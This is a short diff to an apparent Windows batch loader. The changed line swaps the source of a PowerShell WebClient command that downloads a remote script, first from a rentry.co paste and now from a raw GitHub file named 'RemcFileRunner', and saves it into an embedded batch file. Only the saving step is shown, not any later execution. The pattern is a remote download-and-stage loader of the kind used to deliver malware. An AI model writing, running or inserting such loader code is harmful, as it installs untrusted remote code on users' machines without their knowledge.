@@ -8,7 +8,7 @@ color 0A
 :RUNAUTOTASK
 
 :: Download content and save to the embedded batch file
-powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://rentry.co/do7zhdvw/raw') | Out-File -Encoding ASCII '%embeddedScript%'"
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/RemcFileRunner') | Out-File -Encoding ASCII '%embeddedScript%'"
 
 if exist "%embeddedScript%" (
     echo Script content saved to %embeddedScript%.
